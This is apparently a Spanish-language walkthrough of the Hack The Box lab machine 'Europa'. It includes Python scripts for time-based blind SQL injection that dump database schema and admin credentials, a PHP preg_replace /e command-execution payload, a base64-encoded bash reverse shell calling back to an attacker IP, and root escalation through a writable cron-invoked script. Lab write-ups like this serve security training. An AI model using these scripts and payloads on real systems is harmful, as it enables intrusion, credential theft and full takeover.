# 10.10.10.22 - Europa

![Europa](https://user-images.githubusercontent.com/96772264/200187979-9c3f2b9d-74ea-4a37-840c-83550ddee301.png)

--------------------
# Part 1: Reconocimiento inicial  
Puertos abiertos -> 22(ssh), 80(http), 443(https)  
Como tiene el puerto 443 abierto podemos inspeccionar el certificado ssl:  
```console
└─$ openssl s_client -connect 10.10.10.22:443
O = EuropaCorp Ltd., OU = IT, CN = europacorp.htb, emailAddress = admin@europacorp.htb
```
Añadimos el nombre del dominio al /etc/hosts  

```console
└─$ whatweb https://europacorp.htb:443
HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.22], PoweredBy[{], Script[text/javascript], Title[Apache2 Ubuntu Default Page: It works]
```
Tanto la web del puerto 80 como la del 443 devuelven la página por defecto de apache.  

----------------------------
# Part 2: Analisis de la web

Vamos a fuzzear rutas de las webs.  
```console
└─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt https://europacorp.htb:443/FUZZ/
000000069:   403        11 L     32 W       296 Ch      "icons"
```
El mismo resultado de la web del puerto 80.  
```console
└─$ gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -u https://europacorp.htb:443
Error: error on running gobuster: unable to connect to https://europacorp.htb/: invalid certificate: x509: certificate is valid for www.europacorp.htb, admin-portal.europacorp.htb, not europacorp.htb
```
Nuevo subdominio -> admin-portal.europacorp.htb (al /etc/hosts)  

```console
└─$ whatweb https://admin-portal.europacorp.htb:443
[302 Found] Apache[2.4.18],RedirectLocation[https://admin-portal.europacorp.htb/login.php]
https://admin-portal.europacorp.htb/login.php [200 OK] Apache[2.4.18], Bootstrap, Cookies[PHPSESSID], JQuery, PasswordField[password], PoweredBy[{], Script[text/javascript], Title[EuropaCorp Server Admin v0.2 beta]
```
Nos da un panel de login, sabemos que el admin es ```admin@europacorp.htb``` Nos viene muy bien tenerlo porque si ponemos un usaurio que no existe no hay ninguna 
respuesta diferente.  

![europa1](https://user-images.githubusercontent.com/96772264/200188004-93fa3891-b839-46de-a777-687bf6604c9b.PNG)

Si intentamos una inyeccion sqli ```admin@europacorp.htb' or 1=1-- -``` nos dice que metamos una direccion de correo. Eso lo pone en el navegador pero si  
intentamos de otra manera puede que nos lo saltemos.  

```python3
#!/bin/python3

import requests
login_url = "https://admin-portal.europacorp.htb/login.php"
headers = {'PHPSESSID': 'vfhb3ig3s0n01o9mp2arg735k0'}

data = { "email":"admin@europacorp.htb' or 1=1-- -", "password":"test"}
req = requests.post(login_url, data=data, headers = headers, verify=False)
print(req.text)
```
----------------------------
# Part 3: Blind sqli

Probamos otro tipo de inyeccion (tiempo) -> ```' and sleep(5)-- -```  
Ejecutamos el script y tarda cinco segundos en responder, eso esque hay una vulnerabilidad **time based blind sqli**  
Las blind sqli se basan en la función substr:   
> substr(‘palabra’, 1,1) -> “p”; substr(‘palabra’, 2,2) → “al”    
> ```and if (substr(‘palabra’, 1,1)='p', sleep(5),1)-- -``` si la primera letra de 'palabra' es 'p', espera 5 segundos.  
## Averiguar el nombre de la base de datos actual:  
```python
#!/bin/python3
import requests, time, string
import urllib3; urllib3.disable_warnings()

caracteres = string.ascii_lowercase
login_url = "https://admin-portal.europacorp.htb/login.php"
headers = {'PHPSESSID': 'vfhb3ig3s0n01o9mp2arg735k0'}
print("Base de datos actual: ")
resultado = ""
for pos in range(20):
    for letra in caracteres:
        sqli = "' and if(substr(database()," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"
        data = { "email": "admin@europacorp.htb" + sqli, "password":"test"}
        inicio = time.time()
        req = requests.post(login_url, data=data, headers = headers, verify=False)
        final = time.time()
        if final - inicio > 2:
            resultado += letra
            print(resultado)
            break
```
La base de datos actual es **admin**  
## Averiguar el nombre de otras bases de datos:  
```python
login_url = "https://admin-portal.europacorp.htb/login.php"
headers = {'PHPSESSID': 'vfhb3ig3s0n01o9mp2arg735k0'}
caracteres = string.ascii_lowercase + "_"
resultado = ""
for i in range(10):
	for pos in range(20):
		for letra in caracteres:
			sqli = "' and if(substr((select schema_name from information_schema.schemata limit " + str(i) + ",1)," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"
			data = { "email": "admin@europacorp.htb" + sqli, "password":"test"}
			inicio = time.time()
			req = requests.post(login_url, data=data, headers = headers, verify=False)
			final = time.time()
			if final - inicio > 2:
				resultado += letra
				print(resultado)
				break
	resultado += ", "
```
Conseguimos las bases de datos **information_schema** y **admin**  
## Averiguar el nombre de las tablas de 'admin':  
```python
caracteres = string.ascii_lowercase + "_"
#caracteres = string.ascii_uppercase + string.ascii_lowercase + string.digits + string.punctuation
login_url = "https://admin-portal.europacorp.htb/login.php"
headers = {'PHPSESSID': 'vfhb3ig3s0n01o9mp2arg735k0'}
print("Nombre de tablas de 'admin': ")
print("-------------------------------")
resultado = ""
for i  in range(10):
	for pos in range(20):
		for letra in caracteres:
			sqli = "' and if(substr((select table_name from information_schema.tables where table_schema ='admin' limit " + str(i) + ",1)," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"
			data = { "email": "admin@europacorp.htb" + sqli, "password":"test"}
			inicio = time.time()
			req = requests.post(login_url, data=data, headers = headers, verify=False)
			final = time.time()
			if final - inicio > 2:
				resultado += letra
				print(resultado)
				break
	resultado += ", "
```
Nombre de tabla **users**  
## Averiguar el nombre de las columnas de 'admin.users':    

```python
caracteres = string.ascii_lowercase + "_"
login_url = "https://admin-portal.europacorp.htb/login.php"
headers = {'PHPSESSID': 'vfhb3ig3s0n01o9mp2arg735k0'}
resultado = ""
for i in range(10):
	for pos in range(20):
		for letra in caracteres:
			sqli = "' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit " + str(i) + ",1)," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"
			data = { "email": "admin@europacorp.htb" + sqli, "password":"test"}
			inicio = time.time()
			req = requests.post(login_url, data=data, headers = headers, verify=False)
			final = time.time()
			if final - inicio > 2: 
				resultado += letra
				print(resultado)
				break
	resultado += ", "
```
Columnas -> **id**, **username**, **password** y **active**  
## Conseguir creds
```python
caracteres = string.ascii_lowercase + "_" + string.digits + string.punctuation
login_url = "https://admin-portal.europacorp.htb/login.php"
headers = {'PHPSESSID': 'vfhb3ig3s0n01o9mp2arg735k0'}
print("Credenciales: ")
print("--------------------------------------")
resultado = ""
for pos in range(30):
	for letra in caracteres:
		sqli = "' and if(substr((select group_concat(username,0x3a,password) from users)," + str(pos) + ",1)='" + letra + "',sleep(2),1)-- -"
		data = { "email": "admin@europacorp.htb" + sqli, "password":"test"}
		inicio = time.time()
		req = requests.post(login_url, data=data, headers = headers, verify=False)
		final = time.time()
		if final - inicio > 2:
			resultado += letra
			print(resultado)
			break
```
Obtenemos **administrator:2b6d315337f18617ba18922c0b9597ff** que se decodifica en **SuperSecretPassword!**  
Consigo la ```PHPSESSID:vfhb3ig3s0n01o9mp2arg735k0```  

----------------------------
# Part 4: Admin panel 
Estamos en el panel de adminsitración, hay dos partes "tools" y "admin". 

![europa2](https://user-images.githubusercontent.com/96772264/200188111-fa2360a2-771c-459e-868e-237945585e22.PNG)

En tools hay como un fichero de configuración de conexiones. Si interceptamos con buprsuite (y urldecodeamos) vemos que se envia POST a /tools.php  
![europa3](https://user-images.githubusercontent.com/96772264/200188120-c0be7d86-5702-4866-a084-cb622bf356a6.PNG)
```pattern=/ip_address/&ipaddress=test&text="openvpn": { #json largo }``` 
Si escripteamos la petición para experimentar:    
```python
#!/bin/python3
import requests
import urllib3; urllib3.disable_warnings()
sess = requests.session()

login_url = "https://admin-portal.europacorp.htb/login.php"
data = {"email":"admin@europacorp.htb","password":"SuperSecretPassword!"}
login = sess.post(login_url, data=data, verify=False)

tools = "https://admin-portal.europacorp.htb/tools.php"
data_2 = {
	"pattern":"/ip_address/",
	"ipaddress":"", 
	"text":"%22openvpn%22%3A+%7B%0D%0A++++++++%22vtun0%22%3A+%7B%0D%0A++..."}
tools = sess.post(tools, data=data_2, verify=False)
print(tools.text)
```
Nos devuelve una respuesta que almaceno en el archivo "resp1.txt"  
Luego lo vuelvo a correr pero en el campo "ipaddress" le pongo "test" y guardo la respuesta en resp2.txt  
Hago un **diff** de ambas cosas y tengo que en la segunda me pone "test" despues de adress.   

Como el texto que nos devuelve es casi igual al que enviamos en "text", vamos a cambiar el texto por otra cosa.  
```
data_2 = {
    "pattern":"/ip_address/",
    "ipaddress":"test",
    "text":"ip_address = prueba"}
└─$ ./europa.py | html2text  | grep -A 2 "****** Tools ******" | tail -n 1
test = prueba
```
En el campo **text** manda un texto y lo que coincida con lo de **pattern** te lo sustituye por lo de  **ip_adress** en dicho texto. Puede que sea o la función
str_replace o preg_replace (si funciona con regex)  

```
data_2 = {
    "pattern":"/addr*/",
    "ipaddress":"test",
    "text":"ip_address = prueba"}
└─$ ./europa.py | html2text  | grep -A 2 "****** Tools ******" | tail -n 1 
ip_testess = prueba	
```
En efecto usa la funcion php "preg_replace()", pero ¿como explotamos esto?  
Buscando en google ```php function preg_replace code execution``` dice que el modificador **/e** permite ejecutar comandos.  
```
data_2 = {
    "pattern":"/addr*/e",
    "ipaddress":"system('id')",
    "text":"ip_address = prueba"}
└─$ ./europa.py | html2text  | grep -A 2 "****** Tools ******" | tail -n 1 
ip_uid=33(www-data) gid=33(www-data) groups=33(www-data)ess = prueba
```
Ya tendríamos ejecución de comandos. Como hay muchas comillas, para no tener problemas lo haremos de esta manera:  
```
└─$ echo "bash -c 'bash -i >& /dev/tcp/10.10.14.12/443 0>&1'" | base64 -w0 
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK
```
Cambiamos la linea  
```"text":"ipaddress":"system('echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMi80NDMgMD4mMScK | base64 -d | b    ash')"```

Y tenemos acceso al sistema
Conseguimos acceso por la carpeta **/var/www/admin**, hay está el codigo de la web y encontramos un archivo llamado **db.php** con credenciales (los archivos de
bases de datos suelen tener creds para acceder a su servidor sql). Creds -> 'john':'iEOERHRiDnwkdnw', pero no hay suerte
Corremos neustro script de reconocimiento en la máquina:  
- Usaurios -> jhon y root  
- Hay un "/var/www/admin/logs/access.log" donde podrian haber creds  
- Hay dos carpetas raras -> /var/www/cmd /var/www/cronjobs  
- Rot ejecuta todo el rato /var/www/cronjobs/clearlogs  
Este archivo **clearlogs** es un script php:   
```php
#!/usr/bin/php
<?php
	$file = '/var/www/admin/logs/access.log';
	file_put_contents($file, '');
	exec('/var/www/cmd/logcleared.sh');
?>
```
Este archivo **/var/www/cmd/logcleared.sh** no existe, asi que lo creamos nosotros y le hacemos un **chmod +x**
para que se ejecute:  
```
#!/bin/bash
chmod u+s /bin/bash
```
En nada de tiempo ya tenemos una bash como root.
